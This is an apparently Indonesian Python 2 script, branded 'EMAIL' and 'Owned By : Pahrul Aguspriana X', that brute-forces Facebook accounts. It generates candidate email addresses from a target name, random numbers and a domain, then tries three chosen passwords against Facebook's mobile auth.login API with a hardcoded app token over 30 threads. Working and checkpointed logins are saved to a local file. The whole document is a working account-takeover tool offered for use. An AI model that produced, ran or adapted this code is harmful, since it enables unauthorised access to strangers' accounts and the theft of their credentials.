#!/usr/bin/python2
# coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, requests, mechanize

os.system('clear')

logo =('''\n\033[1;91m███████╗███╗   ███╗ █████╗ ██╗██╗     \n██╔════╝████╗ ████║██╔══██╗██║██║     \n█████╗  ██╔████╔██║███████║██║██║     \n██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     \n███████╗██║ ╚═╝ ██║██║  ██║██║███████╗\n╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝\n\n\033[1;97m\033[3mOwned By : Pahrul Aguspriana X \033[00;1m\n''')

os.system('rm -rf .txt')
print (logo)
print"\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Contoh : \033[1;92m1000"
nok = int(raw_input('\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Jumlah yg ingin anda clone :\x1b[1;92m '))
for n in range(nok):
    nm = random.randint(111, 999)
    sys.stdout = open('.txt', 'a')
    print nm
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
   
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


###### LOGO ######

logo =('''\n\033[1;91m███████╗███╗   ███╗ █████╗ ██╗██╗     \n██╔════╝████╗ ████║██╔══██╗██║██║     \n█████╗  ██╔████╔██║███████║██║██║     \n██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     \n███████╗██║ ╚═╝ ██║██║  ██║██║███████╗\n╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝\n\n\033[1;97m\033[3mOwned By : Pahrul Aguspriana X \033[00;1m\n''')


back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

os.system('clear')

def email():
    os.system('clear')
    print logo
    try:
        c = raw_input('\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Nama Target  :\x1b[1;92m ')
        k = raw_input('\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Domain Email :\x1b[1;92m ')
        pass1 = raw_input('\n\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Password 1   : \033[1;92m')
        pass2 = raw_input('\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Password 2   : \033[1;92m')
        pass3 = raw_input('\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Password 3   : \033[1;92m')
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    print('\n\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Total Email  : \033[1;92m' + xxx)
    print ""

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\033[1;92m[OK] ' + c + user + k + ' | ' + pass1
                okb = open('save/email.txt', 'a')
                okb.write('[Berhasil] ' + c + user + k + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\033[1;93m[CP] ' + c + user + k + ' | ' + pass1
                cps = open('save/email.txt', 'a')
                cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\033[1;92m[OK] ' + c + user + k + ' | ' + pass2
                    okb = open('save/email.txt', 'a')
                    okb.write('[Berhasil] ' + c + user + k + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\033[1;93m[CP] ' + c + user + k + ' | ' + pass2
                    cps = open('save/email.txt', 'a')
                    cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\033[1;92m[OK] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/email.txt', 'a')
                        okb.write('[Berhasil] ' + c + user + k + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\033[1;93m[CP] ' + c + user + k + ' | ' + pass3
                        cps = open('save/email.txt', 'a')
                        cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    
                    
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Selesai...'
    print '\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Total\033[1;92m OK\033[1;97m/\033[1;93mCP \033[1;97m:\033[1;92m ' + str(len(oks)) + '\033[1;97m/\033[1;93m' + str(len(cekpoint))
    raw_input('\n\033[1;94m[\033[1;97m<BACK>\033[1;94m]\033[1;97m')
    email()

if __name__ == '__main__':
    email()
